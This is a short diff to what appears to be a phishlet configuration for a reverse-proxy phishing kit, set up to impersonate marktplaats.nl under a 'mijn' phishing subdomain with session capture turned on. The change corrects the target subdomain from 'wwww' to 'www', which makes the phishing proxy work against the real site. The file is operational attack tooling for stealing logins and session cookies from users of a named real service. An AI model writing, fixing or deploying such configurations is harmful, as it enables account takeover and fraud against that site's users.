@@ -2,7 +2,7 @@ author: '@charlesbel'
 min_ver: '2.3.0'
 
 proxy_hosts:
-  - {phish_sub: 'mijn', orig_sub: 'wwww', domain: 'marktplaats.nl', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'mijn', orig_sub: 'www', domain: 'marktplaats.nl', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: 'assets', orig_sub: 'assets', domain: 'marktplaats.nl', session: false, is_landing: false, auto_filter: false}
 
 sub_filters:
